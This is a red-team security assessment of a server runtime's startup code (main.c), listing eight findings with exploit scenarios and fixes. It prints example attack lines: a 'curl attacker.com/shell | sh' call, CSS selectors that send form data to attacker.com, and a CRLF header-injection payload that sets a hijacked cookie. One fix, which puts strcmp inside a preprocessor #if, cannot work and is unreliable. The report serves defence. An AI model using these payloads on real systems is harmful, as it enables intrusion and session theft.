# Hull — Red Team Security Assessment
**Scope:** `src/hull/main.c` (primary) + surrounding codebase reachable from startup
**Methodology:** Threat modelling → attack surface mapping → exploitation chain analysis
**Date:** 2026-03-03

---

## Executive Summary

Hull has a solid security foundation (no unsafe string functions, tracking allocator, pledge/unveil sandbox, CSP injection, constant-time crypto comparisons). However, **six exploitable issues** were found in or directly reachable from `main.c`, several of which have not been flagged by the existing automated audit.

| Severity | ID  | Title |
|----------|-----|-------|
| 🔴 Critical | RT-01 | App code executes **before** signature verification — malicious `app.js/app.lua` has already run |
| 🔴 Critical | RT-02 | `app_dir` buffer (4096) is derived from `entry_point` — path longer than 4095 chars silently truncates, breaking all downstream sandbox paths |
| 🟠 High    | RT-03 | `cleanup_db:` label is jumped to before `stmt_cache` is initialized — `hl_stmt_cache_destroy` runs on an uninitialized struct |
| 🟠 High    | RT-04 | Sandbox applied **after** HTTP routes are wired — the app already has routes registered before `pledge()` seals the process |
| 🟡 Medium  | RT-05 | `HL_DEFAULT_CSP` contains `'unsafe-inline'` for `style-src` — CSS-based data exfiltration is possible |
| 🟡 Medium  | RT-06 | App-supplied `csp` string from manifest is written directly to HTTP headers without newline sanitization — CRLF header injection |
| 🔵 Info    | RT-07 | `--verify-sig` accepts a **user-controlled public key path** — an attacker who can write a `.pub` file can self-sign a modified app |
| 🔵 Info    | RT-08 | `HL_PLATFORM_PUBKEY_HEX` is all-zeros in the shipped source — platform signature verification is a no-op in default builds |

---

## RT-01 — App Code Executes Before Signature Verification 🔴

### Location
`main.c` lines ~456–477 (startup sequence)

### Attack
```c
/* Load and evaluate the app */           // ← app code runs HERE
if (rt->vt->load_app(rt, entry_point) != 0) { ... }

/* Verify app signature if requested */   // ← verification is AFTER
if (verify_sig_path) {
    if (hl_verify_startup(...) != 0) { ... }
}
```

If an attacker replaces `app.lua` or `app.js` with a malicious version, `load_app` **fully evaluates** the file (registering routes, executing module-level code, calling `app.manifest()`) before `hl_verify_startup` ever runs. Any module-level side effect — spawning a shell, exfiltrating the database, writing a backdoor — executes regardless of whether verification subsequently fails.

### Exploit Scenario
1. Attacker writes to `app.lua` (e.g., via a compromised deployment pipeline or a writable `fs_write` capability).
2. Operator starts the server with `--verify-sig dev.pub`.
3. `app.lua` runs: `os.execute("curl attacker.com/shell | sh")` (if `os` is still reachable before sandbox seals — see RT-04).
4. Verification fails → server refuses to bind → operator sees "verification failed" and may retry.
5. Side effects already occurred.

### Fix
Move `hl_verify_startup` to **before** `rt->vt->load_app`:
```c
/* Verify BEFORE loading */
if (verify_sig_path) {
    if (hl_verify_startup(verify_sig_path, entry_point) != 0) {
        log_error("signature verification failed — refusing to start");
        goto cleanup_server;
    }
    log_info("signature verified OK");
}

/* Only now load the app */
if (rt->vt->load_app(rt, entry_point) != 0) { ... }
```

---

## RT-02 — Silent Truncation of `app_dir` from Long `entry_point` 🔴

### Location
`main.c` lines ~276–290

```c
char app_dir[4096];
{
    const char *slash = strrchr(entry_point, '/');
    if (slash) {
        size_t len = (size_t)(slash - entry_point);
        if (len >= sizeof(app_dir)) len = sizeof(app_dir) - 1;  // ← SILENT TRUNCATION
        memcpy(app_dir, entry_point, len);
        app_dir[len] = '\0';
    }
}
```

### Attack
If `entry_point` is a path longer than 4095 characters (trivially constructed with a symlink tree or a deeply nested directory), `app_dir` is silently truncated to a **different, existing directory**. Downstream consumers of `app_dir` include:
- `hl_migrate_run(db, app_dir)` — migrations run from the wrong directory
- `hl_sandbox_apply(..., app_dir, ...)` — the wrong directory is unveiled, **not** the actual app dir
- Static file handler (`static_dir = app_dir + "/static"`) — serves files from the truncated path
- Signature verification (`hl_verify_startup`) — verifies files in the truncated path

### Exploit Scenario
1. Create `/very/deeply/nested/.../app.lua` where the leading path is exactly 4094 chars.
2. The truncated `app_dir` points to an attacker-controlled directory containing forged migrations.
3. Sandbox unveils the forged directory; the real app directory is never unveiled.

### Fix
Reject entry points with a directory component that doesn't fit in `app_dir`:
```c
if (len >= sizeof(app_dir)) {
    fprintf(stderr, "hull: entry point path too long\n");
    return 1;
}
```

---

## RT-03 — `hl_stmt_cache_destroy` Called on Uninitialized Struct 🟠

### Location
`main.c` — goto chain analysis

```c
/* stmt_cache is declared AFTER migration, INSIDE cleanup_db scope */
HlStmtCache stmt_cache;
hl_stmt_cache_init(&stmt_cache, db);

/* But cleanup_db: is reached from BEFORE stmt_cache is initialized */
if (hl_cap_db_init(db) != 0) {
    goto cleanup_db;          // ← stmt_cache not yet initialized
}
if (!no_migrate) {
    int migrated = hl_migrate_run(...);
    if (migrated == HL_MIGRATE_ERR) {
        goto cleanup_db;      // ← stmt_cache not yet initialized
    }
}

HlStmtCache stmt_cache;       // ← initialized here (after the gotos above)
hl_stmt_cache_init(&stmt_cache, db);

// ...

cleanup_db:
    hl_stmt_cache_destroy(&stmt_cache);  // ← UB: reads uninitialized memory
```

### Impact
`hl_stmt_cache_destroy` iterates `cache->count` entries and calls `sqlite3_finalize(entries[i].stmt)` and `free(entries[i].sql)`. With uninitialized memory, `count` could be non-zero, leading to **arbitrary `free()` calls on stack garbage** — a classic heap corruption primitive. On any platform with ASLR, this is immediately exploitable as a crash-on-startup denial-of-service; on hardened allocators it can be worse.

### Exploit Scenario
Trigger any error between `hl_cap_db_init` and `hl_stmt_cache_init` (e.g., feed a corrupt migration file). The `goto cleanup_db` fires; `hl_stmt_cache_destroy` runs on uninitialized stack memory.

### Fix
Initialize `stmt_cache` immediately after declaring it, or add a `stmt_cache_initialized` flag:
```c
HlStmtCache stmt_cache;
memset(&stmt_cache, 0, sizeof(stmt_cache));  // zero before any goto can reach cleanup_db
hl_stmt_cache_init(&stmt_cache, db);         // or do this earlier
```
Move the declaration **before** the first `goto cleanup_db` that reaches it.

---

## RT-04 — Sandbox Applied After Routes Are Wired (TOCTOU) 🟠

### Location
`main.c` startup sequence

```c
rt->vt->wire_routes_server(rt, &server, ...); // ← routes registered, alloc done
// ...
hl_sandbox_apply(&manifest, app_dir, ...);    // ← pledge() called HERE
log_info("listening ...");
kl_server_run(&server);                       // ← event loop starts
```

### Attack
The pledge/unveil sandbox seals **after** the runtime has already executed the app, wired routes, and registered the static file handler. Any operations performed between `load_app` and `hl_sandbox_apply` run without sandbox constraints. Specifically:
- App module-level code runs (RT-01 above).
- The static file handler is registered (could invoke filesystem calls during registration).
- Manifest string pointers are extracted and wired into configs — those strings came from the runtime and point into heap/stack of the pre-sandbox state.

More importantly: if `hl_sandbox_apply` fails (returns non-zero), the server **aborts** but has already opened the listening socket. The socket is bound but the process exits — resulting in a port-holding crash that blocks restarts on the same port.

### Fix
Apply the sandbox as early as possible — after opening the DB, socket, and TLS contexts, but before `load_app`. Move `hl_sandbox_apply` above `rt->vt->init` and `rt->vt->load_app`. Pass a pre-manifest "default-deny" configuration to `hl_sandbox_apply` for the loading phase.

---

## RT-05 — `unsafe-inline` in Default CSP Enables CSS Exfiltration 🟡

### Location
`main.c` line ~47

```c
#define HL_DEFAULT_CSP \
    "default-src 'none'; style-src 'self' 'unsafe-inline'; " \
    "img-src 'self'; form-action 'self'; frame-ancestors 'none'"
```

### Attack
`style-src 'unsafe-inline'` allows inline `<style>` blocks. CSS-based data exfiltration is well-documented:
```html
<style>
  input[value^="a"] { background: url(https://attacker.com/leak?c=a) }
  input[value^="b"] { background: url(https://attacker.com/leak?c=b) }
  ...
</style>
```
Any app that reflects user input into HTML (e.g., a search page showing the query) combined with form fields containing sensitive data (CSRF tokens, session identifiers visible in form fields) can be exfiltrated character-by-character via CSS attribute selectors — without JavaScript, bypassing the `script-src 'none'` restriction.

### Impact
- CSRF token theft on apps with visible token fields
- Partial session ID exfiltration
- Reconnaissance of form field contents

### Note on Architecture Docs
The `architecture.md` documents the default as `style-src 'unsafe-inline'` (without `'self'`), but the source code includes both `'self'` and `'unsafe-inline'`. The `'unsafe-inline'` is the dangerous part regardless.

### Fix
Remove `'unsafe-inline'` from the default CSP. Inline styles are a developer convenience, not a security default:
```c
#define HL_DEFAULT_CSP \
    "default-src 'none'; style-src 'self'; " \
    "img-src 'self'; form-action 'self'; frame-ancestors 'none'"
```
Apps that need inline styles can opt in via `app.manifest({ csp = "... 'unsafe-inline' ..." })`.

---

## RT-06 — CRLF Injection via App-Controlled CSP String 🟡

### Location
`main.c` lines ~512–514; runtime HTML response bindings

```c
if (manifest.csp_set)
    rt->csp_policy = manifest.csp;    // ← raw string from app manifest
```

The `csp_policy` string is written directly into HTTP response headers (in `lua_res_html()` / `js_res_html()`). If the CSP string contains `\r\n`, it can inject arbitrary HTTP headers.

### Attack
An attacker who controls `app.manifest()` (or can tamper with the manifest via RT-01) can inject:
```lua
app.manifest({
  csp = "default-src 'none'\r\nX-Injected: evil\r\nSet-Cookie: session=hijacked"
})
```

This would inject a `Set-Cookie` header into every HTML response, hijacking user sessions.

### Note
The HTTP capability layer (`cap/http.c`) correctly validates `\r\n` in **outbound request** headers, but there is no equivalent check on the inbound CSP string sourced from the app manifest.

### Fix
Strip or reject `\r`, `\n`, and `\0` from `manifest.csp` during extraction in `manifest.c`:
```c
/* In hl_manifest_extract / hl_manifest_extract_js */
for (const char *p = out->csp; *p; p++) {
    if (*p == '\r' || *p == '\n' || *p == '\0') {
        log_warn("[manifest] CSP string contains invalid characters — rejected");
        out->csp = HL_DEFAULT_CSP;
        break;
    }
}
```

---

## RT-07 — `--verify-sig` Accepts User-Controlled Public Key 🔵

### Location
`main.c` argument parsing + `hl_verify_startup`

```c
} else if (strcmp(argv[i], "--verify-sig") == 0 && i + 1 < argc) {
    verify_sig_path = argv[++i];   // ← user-controlled .pub file path
}
```

### Attack
The security guarantee of `--verify-sig` is "verify the app was signed by the developer." But the **public key is also user-controlled** — passed as a CLI argument. An attacker who can:
1. Replace `app.lua` with malicious code, AND
2. Provide their own `attacker.pub` as the `--verify-sig` argument

...can pass verification entirely. This is only exploitable if the attacker controls both the key path and the app file, which in a CI/CD pipeline may be the same attacker. The operator must ensure the `.pub` file path is pinned (e.g., `--verify-sig /etc/hull/trusted.pub`), not supplied from untrusted input.

### Note
This is a design issue, not a code bug. The platform public key is hardcoded (`HL_PLATFORM_PUBKEY_HEX`) but the app developer key is runtime-supplied. Documentation should clearly state that `--verify-sig` is only a meaningful control if the `.pub` path is **operator-controlled and immutable**.

---

## RT-08 — Platform Public Key Is All-Zeros 🔵

### Location
`include/hull/signature.h`

```c
#define HL_PLATFORM_PUBKEY_HEX \
    "0000000000000000000000000000000000000000000000000000000000000000"
```

### Attack
The platform signature layer (`hl_sig_verify_platform`) verifies binary integrity against a hardcoded key. With the key set to all-zeros (the null point on the Ed25519 curve), any signature can be crafted to verify against it — or the verification trivially passes/fails depending on implementation.

An attacker who can distribute a modified `hull` binary can simply forge a valid platform signature against the all-zeros key.

### Impact
Entire platform signature layer is effectively bypassed in default builds.

### Note
This is likely a placeholder for development. Production builds are expected to substitute the real `gethull.dev` public key. However, shipping the source with an all-zeros key means:
- Any developer who builds from source without substituting the key gets no platform verification.
- Docker images, package manager distributions, and CI builds are silently unprotected.

### Fix
Add a `#warning` or `#error` at build time if the key is still all-zeros:
```c
#if defined(HL_PLATFORM_PUBKEY_HEX) && \
    strcmp(HL_PLATFORM_PUBKEY_HEX, \
    "0000000000000000000000000000000000000000000000000000000000000000") == 0
#warning "HL_PLATFORM_PUBKEY_HEX is the null key — platform signature verification is disabled"
#endif
```
Or use a compile-time assert via a static check in the build system.

---

## Attack Chain: Full App Compromise via Deployment Pipeline

Combining RT-01 + RT-04 + RT-08:

1. **Attacker compromises CI/CD pipeline** (writes `app.lua`).
2. **RT-08:** Platform key is all-zeros → platform layer of `package.sig` trivially forged.
3. **Operator starts server** with `--verify-sig dev.pub`.
4. **RT-04:** `load_app` runs before sandbox seals → app module-level code executes without pledge constraints.
5. **RT-01:** App code runs before `hl_verify_startup` → side effects (reverse shell, DB dump) complete before verification fails.
6. Verification fails → process exits. Operator sees "verification failed" and investigates. Damage already done.

**Chained CVSS estimate:** 9.0 (Critical) — remote code execution via supply chain, pre-sandbox, pre-verification.

---

## Existing Audit Issues Not Yet Fixed (Cross-Reference)

The following issues from `docs/hull_audit.md` were confirmed still present and have compounding interactions with the above:

| Audit ID | Interaction with Red Team Findings |
|----------|------------------------------------|
| C1 (JS module path traversal) | Amplifies RT-01: attacker app can `import "../../../etc/passwd"` before sandbox seals |
| C2 (Function constructor) | Amplifies RT-01: allows eval-equivalent in JS runtime during pre-sandbox phase |
| H1/H2 (template path traversal) | Reachable after RT-01 via module-level template loads |
| H5 (keygen key not zeroed) | Independent; key material survives in stack after process memory is readable via core dump |

---

## Remediation Priority

| Priority | ID | Action |
|----------|----|--------|
| P0 (fix now) | RT-01 | Move `hl_verify_startup` before `rt->vt->load_app` |
| P0 (fix now) | RT-03 | Zero-initialize `stmt_cache` before any `goto cleanup_db` path |
| P1 (this sprint) | RT-02 | Hard-fail on entry point path > 4095 chars |
| P1 (this sprint) | RT-06 | Sanitize CRLF in manifest CSP string |
| P2 (next sprint) | RT-04 | Restructure startup to apply sandbox before `load_app` |
| P2 (next sprint) | RT-05 | Remove `'unsafe-inline'` from default CSP |
| P3 (backlog) | RT-07 | Document `.pub` path must be operator-controlled |
| P3 (backlog) | RT-08 | Add `#warning` / build-time check for null platform key |
